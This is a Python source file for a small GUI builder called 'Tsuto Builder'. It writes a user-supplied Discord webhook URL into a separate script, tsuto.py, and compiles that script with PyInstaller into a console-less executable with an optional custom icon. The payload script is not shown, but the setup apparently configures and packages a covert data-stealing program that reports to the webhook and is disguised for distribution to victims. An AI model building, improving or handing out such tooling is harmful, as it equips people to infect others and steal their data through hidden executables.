import os
import shutil
import customtkinter as ctk
from tkinter import messagebox, filedialog
import requests

ctk.set_appearance_mode("dark")
app = ctk.CTk()
app.title(f"Tsuto Builder")
try:
    app.iconbitmap("img\\tsuto.ico")
except Exception:
    pass

app.geometry("400x240")
app.resizable(False, False)

app.update_idletasks()
screen_width = app.winfo_screenwidth()
screen_height = app.winfo_screenheight()
x = (screen_width - app.winfo_reqwidth()) // 2
y = (screen_height - app.winfo_reqheight()) // 2
app.geometry(f"+{x}+{y}")

def validate_webhook(webhook):
    return '/api/webhooks/' in webhook

def replace_webhook(webhook):
    file_path = 'tsuto.py'

    if not os.path.exists(file_path):
        messagebox.showerror("Error", f"Source file '{file_path}' not found.")
        return False

    try:
        with open(file_path, 'r', encoding='utf-8') as file:
            lines = file.readlines()

        for i, line in enumerate(lines):
            if line.strip().startswith('h00k ='):
                lines[i] = f'h00k = "{webhook}"\n'
                break

        with open(file_path, 'w', encoding='utf-8') as file:
            file.writelines(lines)
        return True
    except Exception as e:
        messagebox.showerror("Error", f"Failed to update webhook:\n{e}")
        return False

def select_icon():
    icon_path = filedialog.askopenfilename(filetypes=[("Icon files", "*.ico")])
    return icon_path

def add_icon():
    response = messagebox.askquestion("Add Icon", "Do you want to add an icon?")
    return response == 'yes'

def build_exe():
    webhook = entry.get()

    if validate_webhook(webhook):
        success = replace_webhook(webhook)
        if not success:
            return

        icon_choice = add_icon()

        icon_option = ''
        if icon_choice:
            icon_path = select_icon()
            if not icon_path:
                messagebox.showerror("Error", "No icon file selected.")
                return
            else:
                icon_option = f' --windows-icon-from-ico="{icon_path}"'

        dist_path = os.path.join(os.getcwd(), "dist")
        build_dir = os.path.join(os.getcwd(), "build")
        if os.path.exists(dist_path):
            shutil.rmtree(dist_path)
        if os.path.exists(build_dir):
            shutil.rmtree(build_dir)

        message = "Build process started...\nThis may take a few minutes."
        messagebox.showinfo("Information", message)

        build_command = f'pyinstaller --onefile --noconsole {icon_option} tsuto.py'

        exit_code = os.system(build_command)

        if exit_code == 0:
            messagebox.showinfo("Build Success", "Build process completed successfully.\nCheck your current directory for the .exe file.\n\nDon't forget to star the repo!")
        else:
            messagebox.showerror("Build Failed", "The build process failed. Please check the console output above for errors.")
            
    else:
        messagebox.showerror("Error", "That's not a valid Discord webhook URL")

entry = ctk.CTkEntry(master=app, width=230, height=30, placeholder_text="Enter Discord Webhook URL")
entry.place(relx=0.5, rely=0.4, anchor=ctk.CENTER)

button = ctk.CTkButton(master=app, text="Build EXE", text_color="white", hover_color="#363636", fg_color="black", command=build_exe)
button.place(relx=0.5, rely=0.6, anchor=ctk.CENTER)

app.mainloop()
